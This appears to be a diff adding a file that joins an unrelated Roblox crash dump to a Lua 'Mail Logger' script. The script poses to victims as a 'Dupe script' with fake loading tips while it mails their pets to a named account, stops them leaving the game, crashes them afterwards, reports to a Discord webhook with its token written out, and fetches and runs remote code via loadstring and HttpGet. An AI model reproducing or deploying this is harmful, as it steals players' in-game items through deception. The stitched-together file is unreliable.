@@ -1,0 +1,59 @@
+[Code = 0xC0000005]
+[ExceptSymbol = NoSym]
+[Eip = 0x77AA7B3E]
+[Eax = 0xCAB0CA48]
+[Ebx = 0x61A2DA5C]
+[Ecx = 0xCAB0CA50]
+[Edx = 0x61A2DAA0]
+[Esi = 0x64D00498]
+[Edi = 0x61A2DA50]
+[Ebp = 0x0BCEFA48]
+[Esp = 0x0BCEFA40]
+[Dll Base = 0x00000000]
+
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x019B2E6E]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x019B3251]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x019EB371]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x0197E58E]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x007BD4AA]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x007BD1DA]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x011F9DF2]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x011EE6FB]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x011F0338]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x00B26677]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x00B697E3]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x00B68E58]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x00B3A5E2]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x01CD3C89]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x01CD3E0E]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x01CD2BFD]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x01CDAF52]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x01CDB7F6]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: RobloxPlayerBeta.exe]  [RebaseAddr: 0x026B2EC1]  [BaseAddr: 0x00BE0000]
+[File: UnkFile] [Module: KERNEL32.DLL]          [RebaseAddr: 0x00420099]  [BaseAddr: 0x760A0000]
+[File: UnkFile] [Module: ntdll.dll]             [RebaseAddr: 0x00467B6E]  [BaseAddr: 0x77A40000]
+[File: UnkFile] [Module: ntdll.dll]             [RebaseAddr: 0x00467B3E]  [BaseAddr: 0x77A40000]
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "ibanglutschi" --// Username To Send Pets To
+_G.GiftMessage = "easy pets" --// Message For The Gift To Say
+
+_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1102530807756767312/1Jp7OXI9OApVqgCYX6bAbBN2HrqmwU9hhCgeSi_gFTcSiUXkHTzypFj3BeDXorv54goN" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "Dupe script" --// Script Name On The UI
+_G.Tip1 = "wait ..." --// Gives You Tips On The UI
+_G.Tip2 = "" --// Gives You Tips On The UI
+_G.Tip3 = "Loading ..." --// Gives You Tips On The UI
+_G.Tip4 = "almost finished" --// Gives You Tips On The UI
+_G.Tip5 = "made by me" --// Gives You Tips On The UI
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisMailbox.lua"))()
